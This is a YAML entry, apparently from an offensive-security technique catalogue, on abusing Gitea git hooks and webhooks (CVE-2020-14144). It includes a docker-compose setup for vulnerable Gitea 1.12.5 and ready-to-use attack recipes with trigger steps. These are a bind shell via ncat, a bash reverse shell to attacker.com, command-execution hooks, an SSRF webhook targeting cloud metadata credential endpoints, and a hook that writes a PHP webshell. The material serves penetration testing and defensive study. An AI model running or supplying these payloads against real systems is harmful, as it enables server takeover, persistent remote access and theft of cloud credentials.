---
comment: "Gitea is a self-hosted Git service. Administrators and users with the \"\
  May create\nGit hooks\" permission can attach pre-receive, update, or post-receive\
  \ shell scripts\nto any repository. These hooks execute on the Gitea server process\
  \ on every push,\nproviding OS command execution with the git server user's privileges.\n\
  \nCVE-2020-14144 documents this behavior for Gitea 1.1.0-1.12.5. Starting from\n\
  version 1.13, DISABLE_GIT_HOOKS defaults to true, preventing hook creation unless\n\
  explicitly re-enabled by a site administrator. Earlier versions and installations\n\
  that re-enable hooks remain fully exploitable by any user with hook privileges.\n\
  \nGit hook execution is inherent to Git server functionality, not a vulnerability\n\
  per se \u2014 the vendor considers it expected behavior for privileged users.\n"
docker:
  compose: "services:\n  gitea:\n    image: gitea/gitea:1.12.5\n    ports:\n     \
    \ - \"3000:3000\"\n      - \"2222:22\"\n    environment:\n      USER_UID: \"1000\"\
    \n      USER_GID: \"1000\"\n      GITEA__security__INSTALL_LOCK: \"false\"\n \
    \   volumes:\n      - gitea_data:/data\nvolumes:\n  gitea_data:\n"
  note: "Starts Gitea 1.12.5 (vulnerable to CVE-2020-14144 \u2014 git hooks enabled\
    \ by default,\nallowing any user with hook permissions to execute OS commands\
    \ on push).\nAccess at `http://localhost:3000`. Complete the installer on first\
    \ visit:\ndatabase type SQLite, leave other defaults. Register an admin account\
    \ during install.\nTo enable git hooks for a user: Site Administration \u2192\
    \ Users \u2192 Edit \u2192 Enable \"May create Git hooks\".\n"
functions:
  bind-shell:
  - code: |
      #!/bin/bash
      ncat -lvp 12345 -e /bin/sh &
    comment: |
      Set this script as the post-receive hook (Repository > Settings > Git Hooks >
      post-receive). Trigger by pushing any commit. The trailing & prevents the git
      client from hanging while the shell awaits a connection.
      Connect from the attacker with: nc victim.com 12345
      Requires ncat (nmap package) on the Gitea server.
    connector: tcp-client
    contexts:
      admin:
      authenticated:
    platform: linux
    tty: false
  rce:
  - code: |
      #!/bin/bash
      id
    comment: "Navigate to any repository you own or administer:\nRepository \u2192\
      \ Settings \u2192 Git Hooks \u2192 post-receive\n\nPaste the hook script above\
      \ and click \"Update Hook\". Trigger execution by\npushing a commit to the repository:\n\
      \n  git push origin main\n\nThe hook runs as the Gitea process user (commonly\
      \ git or gitea). Output from\npost-receive hooks is visible in the git push\
      \ terminal output on the client.\nUse pre-receive or update hooks to capture\
      \ output before git processes the push.\n\nRequires the \"Enable Git Hooks\"\
      \ user setting to be active. A site admin can\ngrant it at: Site Administration\
      \ \u2192 Users \u2192 Edit \u2192 May create Git hooks.\n"
    contexts:
      admin:
      authenticated:
    platform: linux
  reverse-shell:
  - blind: true
    code: |
      #!/bin/bash
      bash -i >& /dev/tcp/attacker.com/12345 0>&1 &
    comment: "Set this script as the post-receive hook (Repository \u2192 Settings\
      \ \u2192 Git Hooks \u2192\npost-receive). Trigger by pushing any commit to the\
      \ repository. The trailing &\nprevents the git client from hanging while the\
      \ shell session is active.\nThe shell runs as the Gitea process user (commonly\
      \ git or gitea).\n"
    contexts:
      admin:
      authenticated:
    listener: tcp-server
    platform: linux
    tty: false
  ssrf:
  - code: |
      # Step 1: create a webhook pointing to an internal URL (requires repo admin access)
      curl -s -X POST "http://victim.com:3000/api/v1/repos/<owner>/<repo>/hooks" \
        -H "Authorization: token <api_token>" \
        -H "Content-Type: application/json" \
        -d '{
          "type": "gitea",
          "config": {
            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "content_type": "json"
          },
          "events": ["push"],
          "active": true
        }'

      # Step 2: push a commit to the repository to trigger the webhook
      git commit --allow-empty -m "trigger" && git push
    comment: |
      Gitea webhooks make outbound HTTP POST requests to any configured URL when
      repository events occur. Setting the URL to an internal endpoint causes the
      Gitea server to probe internal services or cloud metadata endpoints.
      The HTTP response status is logged in the webhook delivery history (Repository >
      Settings > Webhooks > click the hook > Recent Deliveries), leaking whether the
      target responded.

      Target cloud metadata endpoints:
      - AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
      - GCP: http://metadata.google.internal/computeMetadata/v1/
      - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01

      Note: Gitea admins can restrict webhook targets via ALLOWED_HOST_LIST in app.ini.
      This is not set by default, leaving all internal endpoints reachable.
    contexts:
      admin:
      authenticated:
  webshell:
  - code: |
      #!/bin/bash
      echo '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>' > /var/www/html/shell.php
    comment: |
      If Gitea shares a host with a PHP web server (common on shared or self-hosted
      setups), this post-receive hook writes a PHP webshell to the webroot.
      Adjust the target path to match the web server document root.
      Access the webshell at: http://victim.com/shell.php?c=id
    contexts:
      admin:
      authenticated:
...
